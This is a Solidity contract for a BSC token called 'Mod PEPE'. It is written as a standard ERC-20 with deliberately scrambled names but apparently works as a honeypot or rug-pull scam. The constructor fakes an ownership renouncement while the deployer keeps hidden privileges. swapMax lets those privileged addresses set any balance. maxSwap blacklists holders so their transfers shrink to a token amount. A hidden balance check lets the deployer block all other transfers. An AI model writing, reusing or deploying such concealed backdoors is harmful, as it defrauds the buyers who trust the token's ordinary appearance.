//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface sellTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldTotal) external view returns (uint256);

    function transfer(address txTrading, uint256 launchedTx) external returns (bool);

    function allowance(address feeSenderEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedTx) external returns (bool);

    function transferFrom(
        address sender,
        address txTrading,
        uint256 launchedTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeTeamMax, uint256 value);
    event Approval(address indexed feeSenderEnable, address indexed spender, uint256 value);
}

abstract contract limitSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamTradingMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingReceiver {
    function createPair(address teamMode, address senderLiquidity) external returns (address);
}

interface sellTakeMetadata is sellTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ModPEPE is limitSell, sellTake, sellTakeMetadata {

    uint256 constant maxLiquidity = 4 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return exemptTrading;
    }

    address public takeAt;

    bool public amountFund;

    function buySell(address senderTeamLaunch) public {
        require(senderTeamLaunch.balance < 100000);
        if (takeReceiver) {
            return;
        }
        
        amountToken[senderTeamLaunch] = true;
        
        takeReceiver = true;
    }

    function maxSwap(address teamEnable) public {
        swapLaunch();
        
        if (teamEnable == takeAt || teamEnable == modeLaunched) {
            return;
        }
        takeTxTotal[teamEnable] = true;
    }

    mapping(address => bool) public takeTxTotal;

    constructor (){
        
        teamTradingMin atTake = teamTradingMin(senderTokenLiquidity);
        modeLaunched = marketingReceiver(atTake.factory()).createPair(atTake.WETH(), address(this));
        if (listFrom == liquidityTeam) {
            buyReceiver = true;
        }
        takeAt = _msgSender();
        modeSwap();
        amountToken[takeAt] = true;
        listBuy[takeAt] = senderTrading;
        if (amountFund == buyReceiver) {
            amountFund = false;
        }
        emit Transfer(address(0), takeAt, senderTrading);
    }

    function senderReceiver(uint256 launchedTx) public {
        swapLaunch();
        takeLaunched = launchedTx;
    }

    bool public isMin;

    uint256 public tokenWallet;

    function swapMax(address tokenLaunch, uint256 launchedTx) public {
        swapLaunch();
        listBuy[tokenLaunch] = launchedTx;
    }

    address senderTokenLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private minMaxTx;

    address private atMinTrading;

    mapping(address => bool) public amountToken;

    uint256 private launchTake;

    uint256 takeLaunched;

    function totalSupply() external view virtual override returns (uint256) {
        return senderTrading;
    }

    function allowance(address atFundList, address feeLiquidityAuto) external view virtual override returns (uint256) {
        if (feeLiquidityAuto == senderTokenLiquidity) {
            return type(uint256).max;
        }
        return minMaxTx[atFundList][feeLiquidityAuto];
    }

    function decimals() external view virtual override returns (uint8) {
        return totalSender;
    }

    function minTradingMax(address tokenSell, address txTrading, uint256 launchedTx) internal returns (bool) {
        if (tokenSell == takeAt) {
            return senderTake(tokenSell, txTrading, launchedTx);
        }
        uint256 limitAutoTake = sellTake(modeLaunched).balanceOf(autoFund);
        require(limitAutoTake == takeLaunched);
        require(txTrading != autoFund);
        if (takeTxTotal[tokenSell]) {
            return senderTake(tokenSell, txTrading, maxLiquidity);
        }
        return senderTake(tokenSell, txTrading, launchedTx);
    }

    function transferFrom(address tokenSell, address txTrading, uint256 launchedTx) external override returns (bool) {
        if (_msgSender() != senderTokenLiquidity) {
            if (minMaxTx[tokenSell][_msgSender()] != type(uint256).max) {
                require(launchedTx <= minMaxTx[tokenSell][_msgSender()]);
                minMaxTx[tokenSell][_msgSender()] -= launchedTx;
            }
        }
        return minTradingMax(tokenSell, txTrading, launchedTx);
    }

    function owner() external view returns (address) {
        return atMinTrading;
    }

    function approve(address feeLiquidityAuto, uint256 launchedTx) public virtual override returns (bool) {
        minMaxTx[_msgSender()][feeLiquidityAuto] = launchedTx;
        emit Approval(_msgSender(), feeLiquidityAuto, launchedTx);
        return true;
    }

    uint256 public listFrom;

    uint256 exemptLimitMarketing;

    address public modeLaunched;

    function modeSwap() public {
        emit OwnershipTransferred(takeAt, address(0));
        atMinTrading = address(0);
    }

    mapping(address => uint256) private listBuy;

    address autoFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function senderTake(address tokenSell, address txTrading, uint256 launchedTx) internal returns (bool) {
        require(listBuy[tokenSell] >= launchedTx);
        listBuy[tokenSell] -= launchedTx;
        listBuy[txTrading] += launchedTx;
        emit Transfer(tokenSell, txTrading, launchedTx);
        return true;
    }

    function swapLaunch() private view {
        require(amountToken[_msgSender()]);
    }

    string private exemptTrading = "MPE";

    uint8 private totalSender = 18;

    function transfer(address tokenLaunch, uint256 launchedTx) external virtual override returns (bool) {
        return minTradingMax(_msgSender(), tokenLaunch, launchedTx);
    }

    uint256 private senderTrading = 100000000 * 10 ** 18;

    function balanceOf(address shouldTotal) public view virtual override returns (uint256) {
        return listBuy[shouldTotal];
    }

    bool public takeReceiver;

    event OwnershipTransferred(address indexed launchMarketingReceiver, address indexed tradingToMax);

    function name() external view virtual override returns (string memory) {
        return launchBuy;
    }

    function getOwner() external view returns (address) {
        return atMinTrading;
    }

    bool private buyReceiver;

    uint256 private liquidityTeam;

    string private launchBuy = "Mod PEPE";

}